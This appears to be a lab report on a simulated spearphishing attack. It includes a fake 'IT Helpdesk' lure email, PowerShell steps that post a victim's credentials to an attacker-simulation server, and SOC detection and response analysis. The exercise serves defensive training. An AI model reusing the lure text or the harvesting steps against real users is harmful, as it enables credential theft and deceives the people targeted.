# AGC-003 — Credential-Harvesting Link Click

> **Execution & Documentation Note:** This scenario was executed
> and documented in full by Claude (Anthropic AI), operating
> autonomously on the lab infrastructure. All commands, detection
> analysis, investigation steps, and conclusions in this report
> were performed by AI, not by a human analyst.

## Card

| Field | Value |
|---|---|
| ID | `AGC-003` |
| Category | `01-phishing` — Phishing & Initial Access |
| MITRE Technique | `T1566.002` Phishing: Spearphishing Link |
| Verdict | True Positive |
| Confidence | Critical |
| Time to Detect | N/A — no automated phishing or credential-harvesting alert fired |
| Time to Triage | 04:00 (from email delivery to credential-capture confirmation) |
| Affected Systems | `COMPROMISED-HOST-01` / `COMPROMISED-01` (10.10.10.103), `EXT-ATTACKER-SIM` (10.10.40.10) |
| Chain | ◀ [AGC-002](../AGC-002-lookalike-domain/README.md) · next [AGC-004](../AGC-004-qr-code-phish/README.md) ▶ |
| One-line Summary | Victim clicks phishing link and submits AD credentials into a fake login portal; attacker server confirms capture. |

## Attacker Perspective

### Tradecraft

**What:** Credential-harvesting phishing — the attacker hosts a convincing login portal (styled as an internal SSO page) on their infrastructure and sends the victim an email containing a link to it. Unlike AGC-001 (display-name spoof) and AGC-002 (homoglyph domain), which tested whether the victim would click a suspicious link, AGC-003 completes the attack by having the victim actually submit valid Active Directory credentials into the fake form. The attacker now possesses working credentials.

**Why at this lifecycle stage:** This is the culmination of the initial-access phishing chain. AGC-001 and AGC-002 delivered links; AGC-003 harvests the credential. Once the attacker has a valid username/password pair, they can authenticate to internal services (Outlook, VPN, RDP, file shares) without needing malware on the endpoint. This is often the path of least resistance for an attacker — social engineering the credential is quieter than exploiting a vulnerability.

**Where in this lab's tooling:**
- **Email gateway:** None. The phishing email is pre-staged as a `.eml` file on COMPROMISED-HOST-01. No SPF/DKIM/DMARC to block or flag it.
- **Endpoint (Sysmon):** EID 1 (Process Create) captures the PowerShell process executing the link click. EID 3 (Network Connection) logs the TCP connection from 10.10.10.103 to 10.10.40.10:80. The POST containing credentials traverses the network in plaintext over HTTP.
- **Wazuh:** No credential-harvesting or phishing rule. Standard Windows logon events fire for the guestcontrol session.
- **Network (Security Onion):** Zeek `http.log` would capture both the GET request for the login page and the POST request containing the submitted credentials — including the form field names (`username`, `password`). This is the strongest detection surface for this scenario.

### Simulation

**Pre-conditions:**
- `COMPROMISED-HOST-01` running, Wazuh agent Active, Sysmon running.
- `EXT-ATTACKER-SIM` running with lab-sink web server on port 80, serving `/portal-login` (credential harvest form) and accepting POST at `/login`.
- Pre-staged `.eml` at `C:\PhishingDelivery\AGC-003-credential-harvest.eml` on COMPROMISED-HOST-01.

**Phishing email content:**
```
From: "IT Helpdesk" <helpdesk@ashfordgrove.local>
To: michael.chen@ashfordgrove.local
Subject: Action Required: Verify Your Account to Access Shared Document
Date: Mon, 15 Sep 2026 14:00:00 +0000
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"

Hi Michael,

A secure document ("Q3-Invoice.pdf") has been shared with you
via our new document portal. Please verify your identity to view it:

http://10.10.40.10/portal-login

This link will expire in 24 hours. If you did not request this
document, please contact the IT Helpdesk immediately.

Best regards,
Ashford Grove IT Helpdesk
```

**Key difference from AGC-001/002:** The victim not only clicks the link but submits their real AD credentials (`michael.chen@ashfordgrove.local` / password) into the fake form. The attacker's server captures and confirms receipt.

**Steps executed (all timestamps UTC):**

| Step | Time (UTC) | Action | Host | Detail |
|---|---|---|---|---|
| 1 | 2026-09-15 17:26:19 | Victim clicks phishing link | COMPROMISED-HOST-01 | `Invoke-WebRequest -Uri 'http://10.10.40.10/portal-login'` — HTTP 200, "Acme Corp - Secure Document Portal" |
| 2 | 2026-09-15 17:26:19 | Form analysis | COMPROMISED-HOST-01 | Credential form detected: `name="username"`, `name="password"`, `action="/login"` |
| 3 | 2026-09-15 17:26:19 | Victim submits AD credentials | COMPROMISED-HOST-01 | `POST http://10.10.40.10/login` with `username=michael.chen@ashfordgrove.local` |
| 4 | 2026-09-15 17:26:19 | Server confirms capture | EXT-ATTACKER-SIM | HTTP 200 — "Sign-in received. Redirecting..." |

**Cleanup:** No persistent changes. HTTP requests were stateless. No files dropped.

## SOC Perspective

### Detection

**Automated alerts:** No phishing-specific or credential-harvesting alert fired. Wazuh generated standard Windows logon events from the guestcontrol session:

| Timestamp (UTC) | Rule ID | Level | Description |
|---|---|---|---|
| 2026-09-15 17:26:17 | 60118 | 3 | Windows Workstation Logon Success |
| 2026-09-15 17:26:17 | 67028 | 3 | Special privileges assigned to new logon |

**Sysmon telemetry (COMPROMISED-HOST-01):**

| Timestamp (UTC) | EID | Event | Detail |
|---|---|---|---|
| 2026-09-15 17:26:18 | 1 | Process Create | `powershell.exe -ExecutionPolicy Bypass -File C:\Temp\agc003-sim.ps1`, parent: `VBoxService.exe` |
| 2026-09-15 17:26:19 | 11 | File Create | Temp files from PowerShell HTTP request execution |
| (prior run 17:00:32) | 3 | Network Connection | `powershell.exe` → `10.10.40.10:80` TCP from `10.10.10.103:53211` (same infrastructure as AGC-002) |

**Detection gap — Critical:** No mechanism detects credential submission to an external host. The POST request containing `username` and `password` form fields travels in plaintext HTTP to an IP outside the trusted network zones. A Zeek `http.log` rule watching for POST requests to non-corporate IPs containing form fields named `user*`/`pass*`/`login*`/`credential*` would catch this pattern. The endpoint-side Sysmon telemetry captures the network connection but not the POST body — network-level detection (Security Onion) is the correct layer for this scenario.

### Investigation

**Step 1 — Email analysis:**
The `.eml` file uses a legitimate-looking sender address (`helpdesk@ashfordgrove.local`) — unlike AGC-001 (spoofed display name) and AGC-002 (homoglyph domain), the sender domain is the organization's actual domain. In a real attack, this could indicate a compromised internal mailbox. The lure ("shared document, verify your identity") creates urgency and a plausible reason for the victim to enter credentials.

**Step 2 — Link destination analysis:**
The link `http://10.10.40.10/portal-login` points to the EXT-SIM-NET (10.10.40.0/24) — outside all trusted zones. The landing page title is "Acme Corp - Secure Document Portal" — same phishing infrastructure used in AGC-001 and AGC-002. The form collects `username` (email) and `password` fields and POSTs to `/login`.

**Step 3 — Credential capture confirmation:**
The POST to `http://10.10.40.10/login` with `username=michael.chen@ashfordgrove.local` returned HTTP 200 with body "Sign-in received. Redirecting..." — confirming the attacker's server captured the credentials. This is the critical escalation from AGC-001/002: the attacker now has a valid AD credential pair for `michael.chen`.

**Step 4 — Cross-reference with AGC-001/002:**
All three phishing scenarios target `michael.chen`, link to `10.10.40.10/portal-login`, and land on the same credential harvesting page. AGC-001 used display-name spoofing, AGC-002 used a homoglyph domain, and AGC-003 achieves the attacker's goal — credential capture. This represents an escalating campaign: reconnaissance (will the victim click?) followed by exploitation (harvest the credential).

**Dead end:** Checked Wazuh for any rule correlating HTTP POST activity with credential-like field names — none exists. Sysmon EID 3 captures the connection but not the HTTP payload.

### Report

**Verdict: True Positive** — Confirmed credential-harvesting phishing attack. Employee `michael.chen` submitted AD credentials into an attacker-controlled fake login portal.

**Confidence: Critical** — Five independent indicators confirm not just malicious intent but actual compromise:
1. Phishing email with urgency lure ("verify your account") and link to external IP
2. Landing page is a credential harvesting form on attacker infrastructure (10.10.40.10)
3. Form fields specifically named `username` and `password` — designed to capture AD credentials
4. Victim submitted valid AD credentials via HTTP POST
5. Attacker server confirmed receipt ("Sign-in received. Redirecting...")

**Response recommendation:**
1. **Immediate:** Reset `michael.chen`'s AD password and revoke all active sessions/tokens. Treat the account as compromised.
2. **Immediate:** Block 10.10.40.10 at OPNsense-FW if not already blocked from AGC-001/002.
3. **Detection engineering:** Create a Zeek/Security Onion rule that flags HTTP POST requests to non-corporate destination IPs where the POST body contains form fields matching patterns: `user*`, `pass*`, `login*`, `credential*`, `email*`. This catches credential harvesting regardless of the domain/IP used.
4. **Detection engineering:** Wazuh custom rule correlating Sysmon EID 3 (outbound connection to non-internal IP on port 80/443) immediately following EID 1 (process creation from email client or browser) — heuristic for phishing-link-then-exfil chain.
5. **Post-compromise hunt:** Search AD logs for any authentication events using `michael.chen`'s credentials from unusual source IPs (especially 10.10.40.0/24 or any external range) in the period between credential capture and password reset.

### MITRE Mapping

| Tactic | Technique ID | Technique Name | Evidence | Confidence |
|---|---|---|---|---|
| Initial Access (TA0001) | T1566.002 | Phishing: Spearphishing Link | Phishing email with link to `http://10.10.40.10/portal-login`; HTTP 200 credential-harvesting form; POST to `/login` with AD credentials; server confirmed capture "Sign-in received" | Critical |

## Evidence

Screenshots: none in phase one (text evidence only); added when this scenario is re-executed by hand in phase two.
